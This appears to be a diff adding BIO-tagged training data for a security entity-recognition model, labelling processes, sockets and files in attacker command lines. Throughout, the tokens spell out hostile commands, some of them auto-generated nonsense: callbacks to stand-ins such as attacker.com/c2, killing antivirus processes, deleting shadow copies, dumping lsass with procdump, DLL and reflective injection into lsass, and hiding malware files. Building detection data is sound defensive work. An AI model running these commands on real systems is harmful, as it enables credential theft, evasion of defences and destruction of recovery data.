+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+svchost.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Body O
+'cmd=whoami'" O
+
+svchost.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Body O
+'cmd=whoami'" O
+
+svchost.exe B-Process
+powershell B-Process
+Start-Process O
+cmd.exe B-Process
+
+svchost.exe B-Process
+powershell B-Process
+Start-Process O
+powershell.exe B-Process
+
+svchost.exe B-Process
+powershell B-Process
+Start-Process O
+rundll32.exe B-Process
+
+svchost.exe B-Process
+powershell B-Process
+Start-Process O
+wmic.exe B-Process
+
+svchost.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+10.10.10.10:4444 B-Socket
+
+svchost.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+192.168.1.100:8080 B-Socket
+
+svchost.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+https://evil.server/payload B-Socket
+
+svchost.exe B-Process
+rm B-Process
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+rm B-Process
+/var/tmp/hide.so B-File
+
+svchost.exe B-Process
+rm B-Process
+C:\Users\Public\runme.bat B-File
+
+svchost.exe B-Process
+rm B-Process
+C:\Windows\Temp\evil.dll B-File
+
+svchost.exe	B-Process
+runas O
+/user:admin O
+cmd.exe B-Process
+
+svchost.exe B-Process
+runas O
+/user:admin O
+rundll32.exe B-Process
+
+svchost.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+10.10.10.10:4444 B-Socket
+
+svchost.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+192.168.1.100:8080 B-Socket
+
+svchost.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+http://attacker.com/c2 B-Socket
+
+svchost.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+https://evil.server/payload B-Socket
+
+svchost.exe B-Process
+taskkill B-Process
+/IM O
+notepad.exe B-Process
+/F O
+
+svchost.exe B-Process
+taskkill B-Process
+/IM O
+svchost.exe B-Process
+/F O
+
+taskkill B-Process
+/F O
+/IM O
+MSASCuiL.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+360rp.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+360safe.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+QQPCMgr.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+QQPCTray.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogGuardCenter.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogServerUI.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogSiteIIS.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+egui.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+ekrn.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+net1895.exe B-Process
+
+taskkill B-Process
+-f O
+-im O
+MsDtsSrvr.exe B-Process
+
+taskkill B-Process
+-f O
+-im O
+msmdsrv.exe B-Process
+
+taskkill B-Process
+-f O
+-im O
+sqlbrowser.exe B-Process
+
+taskkill B-Process
+-f O
+-im O
+sqlservr.exe B-Process
+
+taskkill B-Process
+-f O
+-im O
+sqlwriter.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+360rp.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+360safe.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+QQPCMgr.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+QQPCTray.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogGuardCenter.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogServerUI.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+SafeDogSiteIIS.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+egui.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+ekrn.exe B-Process
+
+taskkill B-Process
+/f O
+/im O
+net1895.exe B-Process
+
+typeperf.exe B-Process
+"\System\Processor B-File
+Queue I-File
+Length" I-File
+-si O
+180 O
+-sc O
+1 O
+
+vssadmin.exe B-Process
+Delete B-File
+Shadows I-File
+/all O
+/quiet O
+
+whoami.exe" B-Process
+/groups O
+
+wmic B-Process
+/node:"192.168.1.2" B-Socket
+process O
+call O
+create O
+"C:\Perflogs\434.bat" B-File
+
+wmic B-Process
+/node:"<redacted>" B-Socket
+process O
+call O
+create O
+"cmd B-Process
+/c O
+c:\perflogs\procdump.exe B-File
+-accepteula O
+-ma O
+lsass B-Process
+c:\perflogs\lsass.dmp" B-File
+
+wmic B-Process
+/node:"<redacted>" B-Socket
+process O
+call O
+create O
+"cmd B-Process
+/c O
+c:\perflogs\procdump.exe" B-Process
+-accepteula O
+-ma O
+lsass B-Process
+c:\perflogs\lsass.dmp B-File
+
+wmic B-Process
+/node:"<redacted>" B-Socket
+process O
+call O
+create O
+"cmd" B-Process
+/c O
+c:\perflogs\procdump.exe B-File
+-accepteula O
+-ma O
+lsass B-Process
+c:\perflogs\lsass.dmp B-File
+
+wmic B-Process
+/node:"hostname" B-Socket
+process O
+call O
+create O
+"C:\Perflogs\12.bat" B-File
+
+wmic.exe B-Process
+Shadowcopy B-File
+Delete I-File
+
+wmic.exe B-Process
+-Command O
+"Start-Process O
+/tmp/malware.sh" B-File
+
+wmic.exe B-Process
+-Command O
+"Start-Process O
+/usr/local/bin/backdoor" B-File
+
+wmic.exe B-Process
+-Command O
+"Start-Process O
+C:\ProgramData\updater.exe" B-File
+
+wmic.exe B-Process
+-Command O
+"Start-Process O
+C:\Users\Public\runme.bat" B-File
+
+wmic.exe B-Process
+-Command O
+"Start-Process O
+C:\Windows\Temp\evil.dll" B-File
+
+wmic.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+wmic.exe B-Process
+-exec O
+/usr/local/bin/backdoor B-File
+
+wmic.exe B-Process
+-exec O
+/var/tmp/hide.so B-File
+
+wmic.exe B-Process
+-exec O
+C:\Users\Public\runme.bat B-File
+
+wmic.exe B-Process
+-exec O
+C:\Windows\Temp\evil.dll B-File
+
+wmic.exe B-Process
+/c O
+start O
+/usr/local/bin/backdoor B-File
+
+wmic.exe B-Process
+/c O
+start O
+/var/tmp/hide.so B-File
+
+wmic.exe B-Process
+/c O
+start O
+C:\ProgramData\updater.exe B-File
+
+wmic.exe B-Process
+/c O
+start O
+C:\Windows\Temp\evil.dll B-File
+
+wmic.exe B-Process
+/c O
+start O
+cmd.exe B-Process
+
+wmic.exe B-Process
+/c O
+start O
+python.exe B-Process
+
+wmic.exe B-Process
+/c O
+start O
+wmic.exe B-Process
+
+wmic.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+explorer.exe B-Process
+
+wmic.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+lsass.exe B-Process
+
+wmic.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+notepad.exe B-Process
+
+wmic.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+wmic.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+wmic.exe B-Process
+Invoke-WebRequest O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Method O
+POST O
+
+wmic.exe B-Process
+Invoke-WebRequest O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Method O
+POST O
+
+wmic.exe B-Process
+Remove-Item O
+C:\ProgramData\updater.exe B-File
+-Force O
+
+wmic.exe B-Process
+Remove-Item O
+C:\Users\Public\runme.bat B-File
+-Force O
+
+wmic.exe B-Process
+Remove-Item O
+C:\Windows\Temp\evil.dll B-File
+-Force O
+
+wmic.exe B-Process
+Set-ProcessInjection O
+-Target O
+lsass.exe B-Process
+
+wmic.exe B-Process
+Set-ProcessInjection O
+-Target O
+svchost.exe B-Process
+
+wmic.exe B-Process
+Stop-Process O
+-Name O
+explorer.exe B-Process
+-Force O
+
+wmic.exe B-Process
+Stop-Process O
+-Name O
+notepad.exe B-Process
+-Force O
+
+wmic.exe B-Process
+Stop-Process O
+-Name O
+svchost.exe B-Process
+-Force O
+
+wmic.exe B-Process
+Stop-Process O
+-Name O
+winlogon.exe B-Process
+-Force O
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+/tmp/malware.sh B-File
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+/usr/local/bin/backdoor B-File
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+/var/tmp/hide.so B-File
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+C:\ProgramData\updater.exe B-File
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Users\Public\runme.bat B-File
+
+wmic.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+wmic.exe B-Process
+chmod B-Process
+777 O
+C:\ProgramData\updater.exe B-File
+
+wmic.exe B-Process
+chmod B-Process
+777 O
+C:\Users\Public\runme.bat B-File
+
+wmic.exe B-Process
+chmod B-Process
+777 O
+C:\Windows\Temp\evil.dll B-File
+
+wmic.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+192.168.1.100:8080 B-Socket
+
+wmic.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+http://attacker.com/c2 B-Socket
+
+wmic.exe B-Process
+del B-Process
+/tmp/malware.sh B-File
+
+wmic.exe B-Process
+del B-Process
+/usr/local/bin/backdoor B-File
+
+wmic.exe B-Process
+dllinjector.exe B-Process
+-p O
+lsass.exe B-Process
+-d O
+payload.dll B-File
+
+wmic.exe B-Process
+dllinjector.exe B-Process
+-p O
+notepad.exe B-Process
+-d O
+payload.dll B-File
+
+wmic.exe B-Process
+dllinjector.exe B-Process
+-p O
+svchost.exe B-Process
+-d O
+payload.dll B-File
+
+wmic.exe B-Process
+icacls B-Process
+/tmp/malware.sh B-File
+/grant O
+Everyone:F O
+
+wmic.exe B-Process
+icacls B-Process
+/var/tmp/hide.so B-File
+/grant O
+Everyone:F O
+
+wmic.exe B-Process
+icacls B-Process
+C:\ProgramData\updater.exe B-File
+/grant O
+Everyone:F O
+
+wmic.exe B-Process
+icacls B-Process
+C:\Users\Public\runme.bat B-File
+/grant O
+Everyone:F O
+
+wmic.exe B-Process
+icacls B-Process
+C:\Windows\Temp\evil.dll B-File
+/grant O
+Everyone:F O
+
+wmic.exe B-Process
+kill O
+$(Get-Process O
+lsass.exe.Id) B-Process
+
+wmic.exe B-Process
+kill O
+$(Get-Process O
+notepad.exe.Id) B-Process
+
+wmic.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+10.10.10.10:4444 B-Socket
+
+wmic.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+192.168.1.100:8080 B-Socket
+
+wmic.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+wmic.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+https://evil.server/payload B-Socket
+
+wmic.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Body O
+'cmd=whoami'" O
+
+wmic.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Body O
+'cmd=whoami'" O
+
+wmic.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Body O
+'cmd=whoami'" O
+
+wmic.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+https://evil.server/payload B-Socket
+-Body O
+'cmd=whoami'" O
+
+wmic.exe B-Process
+powershell B-Process
+Start-Process O
+python.exe B-Process
+
+wmic.exe B-Process
+process O
+call O
+create O
+'regsvr32 B-Process
+-s O
+C:\Users\Public\microsoft.security' B-File
+
+wmic.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+10.10.10.10:4444 B-Socket
+
+wmic.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+192.168.1.100:8080 B-Socket
+
+wmic.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+http://attacker.com/c2 B-Socket
+
+wmic.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+https://evil.server/payload B-Socket
+
+wmic.exe B-Process
+rm B-Process
+/usr/local/bin/backdoor B-File
+
+wmic.exe B-Process
+rm B-Process
+/var/tmp/hide.so B-File
+
+wmic.exe B-Process
+rm B-Process
+C:\ProgramData\updater.exe B-File
+
+wmic.exe B-Process
+rm B-Process
+C:\Windows\Temp\evil.dll B-File
+
+wmic.exe B-Process
+runas O
+/user:admin O
+cmd.exe B-Process
+
+wmic.exe B-Process
+runas O
+/user:admin O
+powershell.exe B-Process
+
+wmic.exe B-Process
+runas O
+/user:admin O
+rundll32.exe B-Process
+
+wmic.exe B-Process
+runas O
+/user:admin O
+wmic.exe B-Process
+
+wmic.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+10.10.10.10:4444 B-Socket
+
+wmic.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+192.168.1.100:8080 B-Socket
+
+wmic.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+http://attacker.com/c2 B-Socket
+
+wmic.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+https://evil.server/payload B-Socket
+
+wmic.exe B-Process
+taskkill B-Process
+/IM O
+explorer.exe B-Process
+/F O
+
+wmic.exe B-Process
+taskkill B-Process
+/IM O
+lsass.exe B-Process
+/F O
+
+wmic.exe B-Process
+taskkill B-Process
+/IM O
+svchost.exe B-Process
+/F O
+
+wmic.exe B-Process
+taskkill B-Process
+/IM O
+taskmgr.exe B-Process
+/F O
+
+wmic_4.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_4.txt B-File
+
+wmic_48.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_48.txt B-File
+
+wmic_6.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_6.txt B-File
+
+wmic_90.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_90.txt B-File
+
+wmic_92.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_92.txt B-File
+
+wmic_97.exe B-Process
+process O
+get O
+commandline O
+< O
+C:\cmd\proc_97.txt B-File
+
+wscript_0.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_0.config B-File
+
+wscript_13.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_13.config B-File
+
+wscript_30.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_30.config B-File
+
+wscript_47.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_47.config B-File
+
+wscript_7.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_7.config B-File
+
+wscript_84.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_84.config B-File
+
+wscript_88.exe B-Process
+readAll O
+C:\inetpub\wwwroot\web_88.config B-File
